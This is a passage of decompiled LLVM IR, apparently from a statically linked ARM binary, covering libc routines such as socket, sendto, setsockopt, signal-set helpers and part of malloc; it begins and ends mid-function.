  %v3_12520 = load i32, i32* @r7, align 4
  store i32 %v3_12520, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12548, label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %entry
  %v0_12538 = call i32 @__GI___errno_location()
  %v0_1253c = load i32, i32* %r7.global-to-local, align 4
  %v1_1253c = sub i32 0, %v0_1253c
  %v2_12540 = inttoptr i32 %v0_12538 to i32*
  store i32 %v1_1253c, i32* %v2_12540, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1254c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %entry, %dec_label_pc_12538
  %v2_1254c = phi i32 [ %v3_12520, %entry ], [ %v2_1254c.pre, %dec_label_pc_12538 ]
  %v0_12548 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12538 ]
  store i32 %v2_1254c, i32* @r7, align 4
  ret i32 %v0_12548

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12548, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12558 = load i32, i32* @r4, align 4
  store i32 %v3_12558, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12588, label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %entry
  %v0_12578 = call i32 @__GI___errno_location()
  %v0_1257c = load i32, i32* %r4.global-to-local, align 4
  %v1_1257c = sub i32 0, %v0_1257c
  %v2_12580 = inttoptr i32 %v0_12578 to i32*
  store i32 %v1_1257c, i32* %v2_12580, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1258c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12588

dec_label_pc_12588:                               ; preds = %entry, %dec_label_pc_12578
  %v2_1258c = phi i32 [ %v3_12558, %entry ], [ %v2_1258c.pre, %dec_label_pc_12578 ]
  %v0_12588 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12578 ]
  store i32 %v2_1258c, i32* @r4, align 4
  ret i32 %v0_12588

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12588, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_125cc, label %dec_label_pc_125bc

dec_label_pc_125bc:                               ; preds = %entry
  %v0_125bc = call i32 @__GI___errno_location()
  %v0_125c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_125c0 = sub i32 0, %v0_125c0
  %v2_125c4 = inttoptr i32 %v0_125bc to i32*
  store i32 %v1_125c0, i32* %v2_125c4, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %entry, %dec_label_pc_125bc
  %v1_125d4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_125bc ]
  ret i32 %v1_125d4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_125dc = load i32, i32* @r7, align 4
  store i32 %v3_125dc, i32* %stack_var_-8, align 4
  %v0_125e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_125e8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_125e8, -4095
  br i1 %tmp, label %dec_label_pc_12608, label %dec_label_pc_125f8

dec_label_pc_125f8:                               ; preds = %entry
  %v0_125f8 = call i32 @__GI___errno_location()
  %v0_125fc = load i32, i32* %r7.global-to-local, align 4
  %v1_125fc = sub i32 0, %v0_125fc
  %v2_12600 = inttoptr i32 %v0_125f8 to i32*
  store i32 %v1_125fc, i32* %v2_12600, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12608.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12608

dec_label_pc_12608:                               ; preds = %entry, %dec_label_pc_125f8
  %v1_1260c = phi i32 [ %v0_125e8, %entry ], [ -1, %dec_label_pc_125f8 ]
  %v2_12608 = phi i32 [ %v3_125dc, %entry ], [ %v2_12608.pre, %dec_label_pc_125f8 ]
  store i32 %v2_12608, i32* @r7, align 4
  ret i32 %v1_1260c

; uselistorder directives
  uselistorder i32 %v0_125e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12608, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_12614 = load i32, i32* @r4, align 4
  %v0_1261c = call i32 @__GI_getpid()
  %v2_12624 = call i32 @kill(i32 %v0_1261c, i32 %arg1)
  store i32 %v3_12614, i32* @r4, align 4
  ret i32 %v2_12624

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_12648, label %dec_label_pc_12640

dec_label_pc_12640:                               ; preds = %entry
  %v7_12644 = icmp slt i32 %arg1, 65
  br i1 %v7_12644, label %dec_label_pc_1265c, label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %dec_label_pc_12640, %entry
  %v0_12648 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12654 = inttoptr i32 %v0_12648 to i32*
  store i32 22, i32* %v2_12654, align 4
  %v0_12664.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12664

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12640
  %v0_1265c = call i32 @__sigaddset()
  store i32 %v0_1265c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_12648, %dec_label_pc_1265c
  %v0_12664 = phi i32 [ %v0_12664.pre, %dec_label_pc_12648 ], [ %v0_1265c, %dec_label_pc_1265c ]
  ret i32 %v0_12664

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1267c = add i32 %tmp, 4
  %v3_1267c = inttoptr i32 %v2_1267c to i32*
  store i32 0, i32* %v3_1267c, align 4
  %v1_12680 = load i32, i32* %r3.global-to-local, align 4
  %v2_12680 = inttoptr i32 %v1_12680 to i32*
  store i32 0, i32* %v2_12680, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12688 = load i32, i32* @r4, align 4
  store i32 %v3_12688, i32* %stack_var_-16, align 4
  %v6_12688 = load i32, i32* @r5, align 4
  %v9_12688 = load i32, i32* @r6, align 4
  %v7_12690 = icmp eq i32 %arg2, -1
  br i1 %v7_12690, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_12698 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_126b4

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_126bc

dec_label_pc_126b4:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  %v7_126b8 = icmp slt i32 %arg1, 65
  br i1 %v7_126b8, label %dec_label_pc_126d0, label %dec_label_pc_126bc

dec_label_pc_126bc:                               ; preds = %.thread16, %dec_label_pc_126b4
  %v0_126bc = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_126c8 = inttoptr i32 %v0_126bc to i32*
  store i32 22, i32* %v2_126c8, align 4
  %v0_12728.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_126d0:                               ; preds = %dec_label_pc_126b4
  %v2_126d0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_126d0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_126d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_126d8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_126e8 = call i32 @__sigaddset()
  %v0_126f0 = load i32, i32* @r5, align 4
  %v0_126f4 = load i32, i32* @r6, align 4
  %v2_126f4 = add i32 %v0_126f4, 27744
  %v2_126f8 = call i32 @__GI___sigismember(i32 %v2_126f4, i32 %v0_126f0)
  store i32 %v2_12698, i32* %r2.global-to-local, align 4
  %v0_12710 = load i32, i32* @r5, align 4
  %v3_12718 = call i32 @__libc_sigaction(i32 %v0_12710, i32 %v2_126d0, i32 %v2_12698)
  %v1_1271c = icmp slt i32 %v3_12718, 0
  br i1 %v1_1271c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_126d0
  %v5_12720 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_12720, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_126d0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_126bc, %bb32
  %v0_12728 = phi i32 [ %v5_12720, %bb31 ], [ %v0_12728.pre, %dec_label_pc_126bc ], [ -1, %bb32 ]
  %v2_12730 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12730, i32* @r4, align 4
  store i32 %v6_12688, i32* @r5, align 4
  store i32 %v9_12688, i32* @r6, align 4
  ret i32 %v0_12728

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126bc, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12740 = add i32 %arg2, -1
  %v3_12744 = udiv i32 %v1_12740, 32
  %v4_12748 = mul nuw nsw i32 %v3_12744, 4
  %v5_12748 = add i32 %v4_12748, %arg1
  %v6_12748 = inttoptr i32 %v5_12748 to i32*
  %v7_12748 = load i32, i32* %v6_12748, align 4
  %v1_1274c = urem i32 %v1_12740, 32
  %v7_12754 = shl i32 1, %v1_1274c
  %v8_12754 = and i32 %v7_12748, %v7_12754
  %v10_12754 = icmp ne i32 %v8_12754, 0
  %. = zext i1 %v10_12754 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_12740, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_12764 = load i32, i32* @r1, align 4
  %v1_12764 = add i32 %v0_12764, -1
  %v3_12768 = udiv i32 %v1_12764, 32
  %v0_1276c = load i32, i32* @r0, align 4
  %v4_1276c = mul nuw nsw i32 %v3_12768, 4
  %v5_1276c = add i32 %v0_1276c, %v4_1276c
  %v6_1276c = inttoptr i32 %v5_1276c to i32*
  %v7_1276c = load i32, i32* %v6_1276c, align 4
  %v1_12770 = urem i32 %v1_12764, 32
  %v7_12778 = shl i32 1, %v1_12770
  %v8_12778 = or i32 %v7_1276c, %v7_12778
  store i32 %v8_12778, i32* %v6_1276c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12764, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_12788 = add i32 %arg2, -1
  %v3_1278c = udiv i32 %v1_12788, 32
  %v4_12790 = mul nuw nsw i32 %v3_1278c, 4
  %v5_12790 = add i32 %v4_12790, %arg1
  %v6_12790 = inttoptr i32 %v5_12790 to i32*
  %v7_12790 = load i32, i32* %v6_12790, align 4
  %v1_12794 = urem i32 %v1_12788, 32
  %tmp = shl i32 -1, %v1_12794
  %v8_1279c = add i32 %tmp, -1
  %v9_1279c = and i32 %v7_12790, %v8_1279c
  store i32 %v9_1279c, i32* %v6_12790, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12788, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_127ac = udiv i32 %arg1, 256
  store i32 %v3_127ac, i32* %r1.global-to-local, align 4
  %v2_127b0 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_127b0, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_127bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_127b0, i32 %v0_127bc)
  %v0_127c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_127c0 = add i32 %v0_127c0, 1048320
  %v3_127c4 = udiv i32 %v1_127c0, 65536
  %v1_127c8 = and i32 %v3_127c4, 8
  %v6_127cc = shl i32 %v0_127c0, %v1_127c8
  %v1_127d0 = add i32 %v6_127cc, 520192
  %v3_127d4 = udiv i32 %v1_127d0, 65536
  %v1_127d8 = and i32 %v3_127d4, 4
  %v6_127dc = shl i32 %v6_127cc, %v1_127d8
  %v1_127e0 = add i32 %v6_127dc, 245760
  %v3_127e4 = udiv i32 %v1_127e0, 65536
  %v1_127e8 = and i32 %v3_127e4, 2
  %v6_127ec = shl i32 %v6_127dc, %v1_127e8
  store i32 %v6_127ec, i32* %r1.global-to-local, align 4
  %v1_127f0 = sub nsw i32 13, %v1_127c8
  %v2_127f4 = sub nsw i32 %v1_127f0, %v1_127d8
  %v3_127f8 = udiv i32 %v6_127ec, 32768
  %v4_127f8 = sub nuw nsw i32 -1, %v3_127f8
  %v4_127fc = udiv i32 %v6_127ec, 16384
  %v5_127fc = and i32 %v4_127fc, %v4_127f8
  %v2_12800 = sub nsw i32 %v2_127f4, %v1_127e8
  %v2_12804 = add nsw i32 %v2_12800, %v5_127fc
  %v1_12808 = add nsw i32 %v2_12804, 6
  %v0_1280c = load i32, i32* %ip.global-to-local, align 4
  %v6_1280c = lshr i32 %v0_1280c, %v1_12808
  %v3_12810 = mul nsw i32 %v2_12804, 4
  %v1_12814 = add nsw i32 %v3_12810, 32
  %v1_12818 = urem i32 %v6_1280c, 4
  %v2_1281c = or i32 %v1_12818, %v1_12814
  ret i32 %v2_1281c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12824 = load i32, i32* @r4, align 4
  %v6_12824 = load i32, i32* @r5, align 4
  %v9_12824 = load i32, i32* @r6, align 4
  %v12_12824 = load i32, i32* @r7, align 4
  %v15_12824 = load i32, i32* @r8, align 4
  %v18_12824 = load i32, i32* @sb, align 4
  %v21_12824 = load i32, i32* @sl, align 4
  %v24_12824 = load i32, i32* @fp, align 4
  %v27_12824 = load i32, i32* @lr, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_12838 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 72) to i32*), align 4
  store i32 %v4_12838, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_12844 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 36) to i32*), align 4
  store i32 %v4_12844, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_12838, i32* %r2.global-to-local, align 4
  %v2_12850 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12850, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  %v4_1285c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 %v4_1285c, i32* %ip.global-to-local, align 4
  store i32 75880, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1285c)
  %v0_12868 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12868, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_12874 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 16) to i32*), align 4
  store i32 %v4_12874, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12880.726 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12874)
  %v0_12880 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_12880, -32
  br i1 %tmp, label %dec_label_pc_1289c, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %entry
  %v0_12888 = call i32 @__GI___errno_location()
  store i32 %v0_12888, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_12894 = inttoptr i32 %v0_12888 to i32*
  store i32 12, i32* %v2_12894, align 4
  br label %dec_label_pc_13118

dec_label_pc_1289c:                               ; preds = %entry
  %v1_1289c = add i32 %v0_12880, 11
  store i32 %v1_1289c, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v2_128a8 = icmp ugt i32 %v1_1289c, 14
  %v7_128a8 = icmp eq i32 %v1_1289c, 15
  %v2_128ac = xor i1 %v7_128a8, true
  %v3_128ac = and i1 %v2_128a8, %v2_128ac
  br i1 %v3_128ac, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_1289c
  %v5_128ac = and i32 %v1_1289c, -8
  store i32 %v5_128ac, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_1289c, %bb
  %v4_128b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_128b0, i32* @r0, align 4
  %v1_128b4 = inttoptr i32 %v4_128b0 to i32*
  %v2_128b4 = load i32, i32* %v1_128b4, align 4
  store i32 %v2_128b4, i32* @r4, align 4
  %v2_128b8 = xor i1 %v2_128a8, true
  %v3_128b8 = or i1 %v7_128a8, %v2_128b8
  br i1 %v3_128b8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_128bc = urem i32 %v2_128b4, 2
  %v2_128bc = icmp eq i32 %v1_128bc, 0
  br i1 %v2_128bc, label %dec_label_pc_128c4, label %dec_label_pc_128d4

dec_label_pc_128c4:                               ; preds = %bb140
  %v2_128c4 = icmp eq i32 %v2_128b4, 0
  br i1 %v2_128c4, label %dec_label_pc_128cc, label %dec_label_pc_12cb0

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128c4
  %v0_128cc = call i32 @__malloc_consolidate()
  store i32 %v0_128cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12cb0

dec_label_pc_128d4:                               ; preds = %bb140
  %v0_128d4 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_128d4, %v2_128b4
  br i1 %tmp201, label %dec_label_pc_128fc, label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %dec_label_pc_128d4
  %v1_128dc = add i32 %v4_128b0, -4
  store i32 %v1_128dc, i32* %r1.global-to-local, align 4
  %v3_128e0 = udiv i32 %v0_128d4, 8
  store i32 %v3_128e0, i32* %r2.global-to-local, align 4
  %v4_128e4 = mul nuw i32 %v3_128e0, 4
  %v5_128e4 = add i32 %v4_128e4, %v1_128dc
  %v6_128e4 = inttoptr i32 %v5_128e4 to i32*
  %v7_128e4 = load i32, i32* %v6_128e4, align 4
  store i32 %v7_128e4, i32* %r0.global-to-local, align 4
  %v2_128e8 = icmp eq i32 %v7_128e4, 0
  br i1 %v2_128e8, label %dec_label_pc_128fc, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_128dc
  %v2_128ec = add i32 %v7_128e4, 8
  %v3_128ec = inttoptr i32 %v2_128ec to i32*
  %v4_128ec = load i32, i32* %v3_128ec, align 4
  store i32 %v4_128ec, i32* %r3.global-to-local, align 4
  store i32 %v2_128ec, i32* %r0.global-to-local, align 4
  store i32 %v2_128ec, i32* %r4.global-to-local, align 4
  store i32 %v4_128ec, i32* %v6_128e4, align 4
  br label %dec_label_pc_130fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128dc, %dec_label_pc_128d4
  %tmp202 = icmp ugt i32 %v0_128d4, 255
  br i1 %tmp202, label %dec_label_pc_1294c, label %dec_label_pc_12904

dec_label_pc_12904:                               ; preds = %dec_label_pc_128fc
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1290c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  %v3_12910 = udiv i32 %v0_128d4, 8
  store i32 %v3_12910, i32* @r7, align 4
  %v4_12914 = mul nuw i32 %v3_12910, 8
  %v5_12914 = add i32 %v4_1290c, %v4_12914
  store i32 %v5_12914, i32* %r3.global-to-local, align 4
  %v1_12918 = add i32 %v5_12914, 44
  store i32 %v1_12918, i32* %ip.global-to-local, align 4
  %v1_1291c = add i32 %v5_12914, 56
  %v2_1291c = inttoptr i32 %v1_1291c to i32*
  %v3_1291c = load i32, i32* %v2_1291c, align 4
  store i32 %v3_1291c, i32* %r0.global-to-local, align 4
  %v9_12920 = icmp eq i32 %v3_1291c, %v1_12918
  br i1 %v9_12920, label %dec_label_pc_12aac, label %dec_label_pc_12928

dec_label_pc_12928:                               ; preds = %dec_label_pc_12904
  %v2_12928 = add i32 %v3_1291c, %v0_128d4
  store i32 %v2_12928, i32* %r3.global-to-local, align 4
  %v1_1292c = add i32 %v2_12928, 4
  %v2_1292c = inttoptr i32 %v1_1292c to i32*
  %v3_1292c = load i32, i32* %v2_1292c, align 4
  store i32 %v3_1292c, i32* %r2.global-to-local, align 4
  %v1_12930 = add i32 %v3_1291c, 12
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  store i32 %v3_12930, i32* %r1.global-to-local, align 4
  %v1_12934 = or i32 %v3_1292c, 1
  store i32 %v1_12934, i32* %r2.global-to-local, align 4
  %v1_12938 = add i32 %v3_1291c, 8
  store i32 %v1_12938, i32* %r4.global-to-local, align 4
  store i32 %v1_12934, i32* %v2_1292c, align 4
  %v0_12940 = load i32, i32* %ip.global-to-local, align 4
  %v1_12940 = load i32, i32* %r1.global-to-local, align 4
  %v2_12940 = add i32 %v1_12940, 8
  %v3_12940 = inttoptr i32 %v2_12940 to i32*
  store i32 %v0_12940, i32* %v3_12940, align 4
  %v0_12944 = load i32, i32* %r1.global-to-local, align 4
  %v1_12944 = load i32, i32* %ip.global-to-local, align 4
  %v2_12944 = add i32 %v1_12944, 12
  %v3_12944 = inttoptr i32 %v2_12944 to i32*
  store i32 %v0_12944, i32* %v3_12944, align 4
  br label %dec_label_pc_130fc

dec_label_pc_1294c:                               ; preds = %dec_label_pc_128fc
  store i32 %v0_128d4, i32* %r0.global-to-local, align 4
  %v1_12950 = call i32 @__malloc_largebin_index(i32 %v0_128d4)
  store i32 %v1_12950, i32* %r0.global-to-local, align 4
  %v0_12954 = load i32, i32* @r4, align 4
  %v1_12954 = and i32 %v0_12954, 2
  %v2_12954 = icmp eq i32 %v1_12954, 0
  store i32 %v1_12950, i32* @r7, align 4
  br i1 %v2_12954, label %dec_label_pc_12aac, label %dec_label_pc_12960

dec_label_pc_12960:                               ; preds = %dec_label_pc_1294c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_12968 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12968, i32* @r0, align 4
  %v0_1296c = call i32 @__malloc_consolidate()
  store i32 %v0_1296c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12aac

dec_label_pc_12974:                               ; preds = %dec_label_pc_12ac0
  %v1_12974 = add i32 %v3_12ac0, 4
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r3.global-to-local, align 4
  %v0_12978 = load i32, i32* @sl, align 4
  %v1_1297c = and i32 %v3_12974, -4
  store i32 %v1_1297c, i32* %r4.global-to-local, align 4
  %v1_12980 = add i32 %v3_12ac0, 12
  %v2_12980 = inttoptr i32 %v1_12980 to i32*
  %v3_12980 = load i32, i32* %v2_12980, align 4
  store i32 %v3_12980, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_12978, 255
  br i1 %tmp203, label %dec_label_pc_129dc, label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_12974
  %v9_12988 = icmp eq i32 %v3_12980, %v0_129e0
  br i1 %v9_12988, label %dec_label_pc_12990, label %dec_label_pc_129dc

dec_label_pc_12990:                               ; preds = %dec_label_pc_12988
  %v0_12990 = load i32, i32* @sb, align 4
  %v1_12990 = add i32 %v0_12990, 48
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %r3.global-to-local, align 4
  %v9_12994 = icmp eq i32 %v3_12ac0, %v3_12990
  br i1 %v9_12994, label %dec_label_pc_1299c, label %dec_label_pc_129dc

dec_label_pc_1299c:                               ; preds = %dec_label_pc_12990
  %v1_1299c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_1297c, %v1_1299c
  br i1 %tmp204, label %dec_label_pc_129a4, label %dec_label_pc_129dc

dec_label_pc_129a4:                               ; preds = %dec_label_pc_1299c
  %v2_129a4 = sub i32 %v1_1297c, %v0_12978
  store i32 %v2_129a4, i32* %r2.global-to-local, align 4
  %v2_129a8 = add i32 %v0_12978, %v3_12ac0
  store i32 %v2_129a8, i32* %r3.global-to-local, align 4
  %v1_129ac = or i32 %v0_12978, 1
  store i32 %v1_129ac, i32* %r0.global-to-local, align 4
  %v1_129b0 = or i32 %v2_129a4, 1
  store i32 %v1_129b0, i32* %r1.global-to-local, align 4
  %v1_129b4 = add i32 %v3_12ac0, 8
  store i32 %v1_129b4, i32* %r4.global-to-local, align 4
  %v2_129b8 = add i32 %v0_129e0, 8
  %v3_129b8 = inttoptr i32 %v2_129b8 to i32*
  store i32 %v2_129a8, i32* %v3_129b8, align 4
  %v0_129bc = load i32, i32* %r3.global-to-local, align 4
  %v1_129bc = load i32, i32* %ip.global-to-local, align 4
  %v2_129bc = add i32 %v1_129bc, 12
  %v3_129bc = inttoptr i32 %v2_129bc to i32*
  store i32 %v0_129bc, i32* %v3_129bc, align 4
  %v0_129c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_129c0 = load i32, i32* @r6, align 4
  %v2_129c0 = add i32 %v1_129c0, 4
